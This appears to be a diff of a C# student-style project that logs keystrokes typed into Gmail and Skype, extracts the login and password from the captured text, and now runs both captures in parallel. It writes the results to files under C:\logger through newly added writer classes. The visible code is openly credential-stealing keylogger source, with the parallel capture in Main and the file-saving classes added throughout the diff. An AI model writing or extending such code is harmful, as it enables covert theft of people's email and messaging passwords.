@@ -3,6 +3,8 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 using System.Text.RegularExpressions;
+using System.IO;
+using System.Threading.Tasks;
 
 namespace CourseTest1
 {
@@ -19,25 +21,24 @@ namespace CourseTest1
 
         static void Main(string[] args)
         {
-            GmailLogger gmaillogger = new GmailLogger();
-            Logger glogger = new Logger(gmaillogger);
-            string glogs = glogger.Log();
-            GmailFind gfind = new GmailFind();
-            gfind.Find(glogs);
-            string glogin = gfind.login, gpassword = gfind.password;
-            Console.WriteLine("Skype" + glogin + " " + gpassword);
-
-            SkypeLogger skypelogger = new SkypeLogger();
-            Logger slogger = new Logger(skypelogger);
-            string slogs = slogger.Log();
-            SkypeFind sfind = new SkypeFind();
-            sfind.Find(slogs);
-            string slogin = sfind.login, spassword = sfind.password;
-            Console.WriteLine("Skype" + slogin + " " + spassword);
-
-            Console.ReadKey();
+            Task.WaitAll(
+                Task.Run(() =>
+                {
+                    Finder gfinder = new Finder(new GmailFind());
+                    gfinder.Find(new Logger(new GmailLogger()).Log());
+                    new Writer(new FileWriter()).Write("Gmail:" + Environment.NewLine + gfinder.finder.login
+                        + Environment.NewLine + gfinder.finder.password, @"C:\logger\gmaillogs.txt");
+                }),
+                Task.Run(() =>
+                {
+                    Finder sfinder = new Finder(new SkypeFind());
+                    sfinder.Find(new Logger(new SkypeLogger()).Log());
+                    new Writer(new FileWriter()).Write("Skype:" + Environment.NewLine + sfinder.finder.login
+                        + Environment.NewLine + sfinder.finder.password, @"C:\logger\skypelogs.txt");
+                })
+            );
         }
-
+        //////////////////////////////////////////////////////////////
         interface ILogger//интерфейс логгирования
         {
             string appname { get; set; }
@@ -134,7 +135,7 @@ namespace CourseTest1
                 return logger.Log();
             }
         }
-
+        //////////////////////////////////////////////////////////////
         interface IFind//интерфейс поиска в логах почты и пороля
         {
             string login { get; set; }
@@ -184,6 +185,19 @@ namespace CourseTest1
             }
         }
 
+        class Finder
+        {
+            public IFind finder;
+            public Finder(IFind finder)
+            {
+                this.finder = finder;
+            }
+            public void Find(string logs)
+            {
+                finder.Find(logs);
+            }
+        }
+        //////////////////////////////////////////////////////////////
         interface IUpgrade//интерфейс форматирования символов клавиатуры
         {
             string Upgrade(string sym);
@@ -220,6 +234,34 @@ namespace CourseTest1
                 else
                     Shift = false;
                 return temp;
+            }
+        }
+        ///////////////////////////////////////////////
+        interface IWriter
+        {
+            void Write(string path, string s);
+        }
+
+        class FileWriter : IWriter
+        {
+            public void Write(string path, string s)
+            {
+                if (!Directory.Exists(@"C:\logger"))
+                    Directory.CreateDirectory(@"C:\logger");
+                File.WriteAllText(path, s);
+            }
+        }
+
+        class Writer
+        {
+            public IWriter writter;
+            public Writer(IWriter writter)
+            {
+                this.writter = writter;
+            }
+            public void Write(string s, string path)
+            {
+                writter.Write(path, s);
             }
         }
     }
